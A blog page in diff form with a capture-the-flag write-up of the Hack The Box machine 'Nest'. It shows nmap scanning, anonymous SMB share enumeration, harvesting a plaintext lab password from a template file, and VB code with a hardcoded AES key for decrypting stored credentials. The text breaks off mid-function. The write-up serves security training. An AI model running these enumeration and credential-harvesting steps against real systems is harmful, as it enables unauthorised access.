@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Nest | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/06/htb-nest.html" title="Read more" class="entry-title-link">
+                HTB: Nest</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-06-07T17:25:00+02:00">07 Jun 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/vb.html" title="Read more with the label VB" class="meta-link">VB</a> 
+          <a href="../../tag/net.html" title="Read more with the label .NET" class="meta-link">.NET</a> 
+          <a href="../../tag/re.html" title="Read more with the label RE" class="meta-link">RE</a> 
+          <a href="../../tag/smb.html" title="Read more with the label SMB" class="meta-link">SMB</a> 
+          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 13 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.06/nest_card.png" alt="Nest card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/225">Nest</a>
+This box is classified as an easy machine. It was publish on January the 25th by
+<a href="https://www.hackthebox.eu/home/users/profile/158833">VbScrub</a>.
+This box is a bit different that the other ones on HTB. Until the last step you
+never have a shell on the box (and none is needed to root it). All commands and
+enumeration are done on the SMB service. There is also a personnalized service
+HQK.</p>
+<p>Getting user involve understanding a bit of cryptography (homemade combination
+of base64 and AES) but nothing too complexe.</p>
+<p>Getting root required to decompile some .NET executable to get some parameter
+for the homemade encryption.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. Only the ports 445 (SMB) and 4386 are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Jan 27 03:59:58 2020 as: nmap -p- -sS -oA nmap_p 10.10.10.178</span>
+<span class="code-line">Nmap scan report for 10.10.10.178</span>
+<span class="code-line">Host is up (0.26s latency).</span>
+<span class="code-line">Not shown: 65533 filtered ports</span>
+<span class="code-line">PORT     STATE SERVICE</span>
+<span class="code-line">445/tcp  open  microsoft-ds</span>
+<span class="code-line">4386/tcp open  unknown</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Mon Jan 27 04:08:04 2020 -- 1 IP address (1 host up) scanned in 485.47 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="hqk-reporting-service">HQK Reporting Service</h2>
+<p>We connect to the port 4386 using telnet. This service allow us to list the
+files on the system but nothing more. The <code>DEBUG</code> function seems interesting but
+we need a password for it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>#telnet 10.10.10.178 4386</span>
+<span class="code-line">Trying 10.10.10.178...</span>
+<span class="code-line">Connected to 10.10.10.178.</span>
+<span class="code-line">Escape character is &#39;^]&#39;.</span>
+<span class="code-line"></span>
+<span class="code-line">HQK Reporting Service V1.2</span>
+<span class="code-line"></span>
+<span class="code-line">&gt;help</span>
+<span class="code-line"></span>
+<span class="code-line">This service allows users to run queries against databases using the legacy HQK format</span>
+<span class="code-line"></span>
+<span class="code-line">--- AVAILABLE COMMANDS ---</span>
+<span class="code-line"></span>
+<span class="code-line">LIST</span>
+<span class="code-line">SETDIR &lt;Directory_Name&gt;</span>
+<span class="code-line">RUNQUERY &lt;Query_ID&gt;</span>
+<span class="code-line">DEBUG &lt;Password&gt;</span>
+<span class="code-line">HELP &lt;Command&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">&gt;SETDIR C:\Users\</span>
+<span class="code-line"></span>
+<span class="code-line">Current directory set to Users</span>
+<span class="code-line">&gt;LIST</span>
+<span class="code-line"></span>
+<span class="code-line">Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command</span>
+<span class="code-line"></span>
+<span class="code-line"> QUERY FILES IN CURRENT DIRECTORY</span>
+<span class="code-line"></span>
+<span class="code-line">[DIR]  Administrator</span>
+<span class="code-line">[DIR]  All Users</span>
+<span class="code-line">[DIR]  Default</span>
+<span class="code-line">[DIR]  Default User</span>
+<span class="code-line">[DIR]  Public</span>
+<span class="code-line">[DIR]  Service_HQK</span>
+<span class="code-line">[DIR]  TempUser</span>
+<span class="code-line">[1]   desktop.ini</span>
+<span class="code-line"></span>
+<span class="code-line">Current Directory: Users</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="smb">SMB</h2>
+<p>We enumerate the shares on the SMB server using metasploit. The share <code>Data</code>
+seems interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 &gt; use auxiliary/scanner/smb/smb_enumshares</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.178</span>
+<span class="code-line">RHOSTS =&gt; 10.10.10.178</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run</span>
+<span class="code-line"></span>
+<span class="code-line">[+] 10.10.10.178:445      - ADMIN$ - (DISK) Remote Admin</span>
+<span class="code-line">[+] 10.10.10.178:445      - C$ - (DISK) Default share</span>
+<span class="code-line">[+] 10.10.10.178:445      - Data - (DISK)</span>
+<span class="code-line">[+] 10.10.10.178:445      - IPC$ - (IPC) Remote IPC</span>
+<span class="code-line">[+] 10.10.10.178:445      - Secure$ - (DISK)</span>
+<span class="code-line">[+] 10.10.10.178:445      - Users - (DISK)</span>
+<span class="code-line">[*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We connect to this share anonymously and start to enumerate the folder and files
+on the share. We quickly find a "Welcome Email" in the HR templates folder.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># smbclient //10.10.10.178/Data -U &quot; &quot;%&quot; &quot;</span>
+<span class="code-line">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="code-line">smb: \&gt; cd Shared\Templates\HR</span>
+<span class="code-line">smb: \Shared\Templates\HR\&gt; mget &quot;Welcome Email.txt&quot;</span>
+<span class="code-line">Get file Welcome Email.txt? y</span>
+<span class="code-line">getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span>
+<span class="code-line"></code></pre></div>
+
+<p>This template email contain the username "TempUser" and its password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># cat Welcome\ Email.txt</span>
+<span class="code-line">We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">You will find your home folder in the following location:</span>
+<span class="code-line">\\HTB-NEST\Users\&lt;USERNAME&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">If you have any issues accessing specific services or workstations, please inform the</span>
+<span class="code-line">IT department and use the credentials below until all systems have been set up for you.</span>
+<span class="code-line"></span>
+<span class="code-line">Username: TempUser</span>
+<span class="code-line">Password: welcome2019</span>
+<span class="code-line"></span>
+<span class="code-line">Thank you</span>
+<span class="code-line">HR</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="sbm-as-tempuser">SBM as TempUser</h2>
+<p>We can then connect to the SMB share using our "TempUser". We found a lot of
+configuration files. The <code>RU_config.xml</code> contain what seems to be a base64
+password for the c.smith user. We try to decode it using <code>base64 -d</code> but the result is not printable
+characters.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># cat RU_config.xml</span>
+<span class="code-line">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="code-line">&lt;ConfigFile xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</span>
+<span class="code-line">  &lt;Port&gt;389&lt;/Port&gt;</span>
+<span class="code-line">  &lt;Username&gt;c.smith&lt;/Username&gt;</span>
+<span class="code-line">  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;</span>
+<span class="code-line">&lt;/ConfigFile&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>Looking a bit more at the files we found the NotepadPlusPlus configuration file
+containing the history of the recently edited files. The
+<code>\\HTB-NEST\Secure$\IT\Carl\Temp.txt</code> seems to be interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>#tail config.xml</span>
+<span class="code-line">        &lt;Find name=&quot;redeem on&quot; /&gt;</span>
+<span class="code-line">        &lt;Find name=&quot;192&quot; /&gt;</span>
+<span class="code-line">        &lt;Replace name=&quot;C_addEvent&quot; /&gt;</span>
+<span class="code-line">    &lt;/FindHistory&gt;</span>
+<span class="code-line">    &lt;History nbMaxFile=&quot;15&quot; inSubMenu=&quot;no&quot; customLength=&quot;-1&quot;&gt;</span>
+<span class="code-line">        &lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&gt;</span>
+<span class="code-line">        &lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&gt;</span>
+<span class="code-line">        &lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&gt;</span>
+<span class="code-line">    &lt;/History&gt;</span>
+<span class="code-line">&lt;/NotepadPlus&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>We connect to the "Secure$" share and go to Carl's folder. The Temp.txt doesn't
+exist anymore but we found some visual basic code in a WIP folder.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># smbclient //10.10.10.178/Secure$ -U &quot;TempUser&quot;%&quot;welcome2019</span>
+<span class="code-line">smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; dir</span>
+<span class="code-line">.                                   D        0  Wed Aug  7 18:05:54 2019</span>
+<span class="code-line">..                                  D        0  Wed Aug  7 18:05:54 2019</span>
+<span class="code-line">bin                                 D        0  Wed Aug  7 16:00:11 2019</span>
+<span class="code-line">ConfigFile.vb                       A      772  Wed Aug  7 18:05:09 2019</span>
+<span class="code-line">Module1.vb                          A      279  Wed Aug  7 18:05:44 2019</span>
+<span class="code-line">My Project                          D        0  Wed Aug  7 16:00:11 2019</span>
+<span class="code-line">obj                                 D        0  Wed Aug  7 16:00:11 2019</span>
+<span class="code-line">RU Scanner.vbproj                   A     4828  Fri Aug  9 11:37:51 2019</span>
+<span class="code-line">RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019</span>
+<span class="code-line">SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019</span>
+<span class="code-line">Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019</span>
+<span class="code-line"></code></pre></div>
+
+<p>We download everything on our computer. The "Module1.vb" file is a module
+loading a XML file "RU_config.xml" and using the Utils library to decode the
+password stored in the file. We already have the XML file.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">Module</span><span class="w"> </span><span class="nn">Module1</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Sub</span><span class="w"> </span><span class="nf">Main</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ConfigFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConfigFile</span><span class="p">.</span><span class="n">LoadFromFile</span><span class="p">(</span><span class="s">&quot;RU_Config.xml&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">SsoIntegration</span><span class="w"> </span><span class="k">With</span><span class="w"> </span><span class="p">{.</span><span class="n">Username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Config</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">Config</span><span class="p">.</span><span class="n">Password</span><span class="p">)}</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Hello&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">End</span><span class="w"> </span><span class="k">Module</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The "Utils.vb" file contain the decrypting methods and the passphrase, the salt
+value, the number of password iteration, the initialisation vector (for CBC mode)
+and the key size.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">Imports</span><span class="w"> </span><span class="nn">System.Text</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Imports</span><span class="w"> </span><span class="nn">System.Security.Cryptography</span><span class="w"></span></span>
+<span class="code-line"><span class="k">Public</span><span class="w"> </span><span class="k">Class</span><span class="w"> </span><span class="nc">Utils</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">GetLogFilePath</span><span class="p">()</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Return</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">CurrentDirectory</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Log.txt&quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">)</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">If</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">Empty</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Else</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">EncryptString</span><span class="p">(</span><span class="n">PlainString</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">)</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">If</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">PlainString</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">Empty</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Else</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Encrypt</span><span class="p">(</span><span class="n">PlainString</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">Encrypt</span><span class="p">(</span><span class="k">ByVal</span><span class="w"> </span><span class="n">plainText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passPhrase</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">saltValue</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                    </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passwordIterations</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">initVector</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">keySize</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">)</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                          </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">saltValueBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">plainText</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">saltValueBytes</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                          </span><span class="n">passwordIterations</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">keyBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">symmetricKey</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">AesCryptoServiceProvider</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">encryptor</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ICryptoTransform</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">Using</span><span class="w"> </span><span class="n">memoryStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">Using</span><span class="w"> </span><span class="n">cryptoStream</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="n">encryptor</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                            </span><span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="k">Dim</span><span class="w"> </span><span class="n">cipherTextBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">                </span><span class="k">Return</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="w">            </span><span class="k">End</span><span class="w"> </span><span class="k">Using</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">Using</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span><span class="w"> </span><span class="n">cipherText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passPhrase</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">saltValue</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                    </span><span class="k">ByVal</span><span class="w"> </span><span class="n">passwordIterations</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">initVector</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                                  </span><span class="k">ByVal</span><span class="w"> </span><span class="n">keySize</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Integer</span><span class="p">)</span><span class="w"> </span>_<span class="w"></span></span>
+<span class="code-line"><span class="w">                          </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">initVectorBytes</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">Byte</span><span class="p">()</span><span class="w"></span></span>
+<span class="code-line"><span class="w">        </span><span class="n">initVectorBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
